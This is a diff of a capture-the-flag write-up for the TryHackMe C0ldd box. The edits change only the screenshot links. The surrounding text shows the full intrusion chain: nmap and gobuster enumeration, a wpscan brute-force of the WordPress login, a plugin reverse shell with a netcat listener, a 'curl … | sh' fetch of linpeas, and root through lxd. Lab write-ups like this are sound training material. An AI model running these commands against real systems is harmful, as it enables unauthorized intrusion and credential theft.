@@ -6,7 +6,7 @@ So lets start with some nmap scan to enumerate which all ports are open.
 ```bash
 $ sudo nmap -T4 -sV -A target > nmap_scan.txt 
 ```
-<p align="center"> <img src="https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/1.png" width="550" ></p>
+<p align="center"> <img src="./Screenshots/1.png" width="550" ></p>
 
 
 So port 80 is open that I already knew by opening the ip in web browser.
@@ -15,12 +15,12 @@ access control.
 ```bash
 $ sudo gobuster dirb -u target:80 --wordlist /usr/share/wordlists/dirb/small.txt -e -o dir.txt 
 ```
-<p align="center"> <img src="https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/2.png" width="550" ></p>
+<p align="center"> <img src="./Screenshots/2.png" width="550" ></p>
 
 There is a ‘/hidden’ directory on the target that is accessible and gave
 potential users on the target.
 
-<p align="center"> <img src="https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/3.png" width="550" ></p>
+<p align="center"> <img src="./Screenshots/3.png" width="550" ></p>
 
 And since web page is made on wordpress and there is a login page, great
 option to bruteforce wordpress login is using wpscan.
@@ -28,7 +28,7 @@ option to bruteforce wordpress login is using wpscan.
 ```bash
 $ sudo wpscan --url http://target/wp-login.php -e u -P /usr/share/wordlist/rockyou.txt 
 ```
-<p align="center"> <img src="https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/4.png" width="550" ></p>
+<p align="center"> <img src="./Screenshots/4.png" width="550" ></p>
 Bingo!!! we have a password for c0ldd user. After login we have an
 admin dashboard.
 
@@ -36,7 +36,7 @@ Lest get a reverse shell on the target using WP plugin. I found this simple
 reverse shell script on
 <https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell>.
 
-<p align="center"> <img src="https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/5.png" width="550" ></p>
+<p align="center"> <img src="./Screenshots/5.png" width="550" ></p>
 I started a netcat listener on my machine on port 8000 
 
 ```bash 
@@ -59,7 +59,7 @@ $ curl http://<attackbox_ip>:1234/linpeas.sh | sh
 This will directly
 run the shell script on the target machine.
 
-<p align="center"> <img src="https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/6.png" width="550" ></p>
+<p align="center"> <img src="./Screenshots/6.png" width="550" ></p>
 This gave away wp-config.php file that contained password of user _c0ldd_.
 To su to _c0ldd_ user we need a stable shell, stablizing shell by this great
 one-liner 
@@ -74,7 +74,7 @@ and use password _cybersecurity_ to get access. Now cat the user.txt flag in _/h
 $ cat /home/c0ldd/user.txt 
 ```
 
-<p align="center"> <img src="https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/7.png" width="550" ></p>
+<p align="center"> <img src="./Screenshots/7.png" width="550" ></p>
 Hurray!! got the user flag.
 
 ##### Now lets get root access.
@@ -82,7 +82,7 @@ Hurray!! got the user flag.
 Linpeas enumeration also gave potential services, users that could be
 exploited. Luckly lxd (container service) is present and accessible by _c0ldd_ user.
 
-<p align="center"> <img src="https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/8.png" width="550" ></p>
+<p align="center"> <img src="./Screenshots/8.png" width="550" ></p>
 
 Lets exploit this service, Download the vulnerable container image using [alpine for lxd](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
 cd to download dir and start http server and transfer the file to target machine.
@@ -111,6 +111,6 @@ inside it
 $ cat /mnt/root/root.txt 
 ```
 
-<p align="center"> <img src="https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/9.png" width="550" ></p>
+<p align="center"> <img src="./Screenshots/9.png" width="550" ></p>
 
 **With that the we rooted the box.**
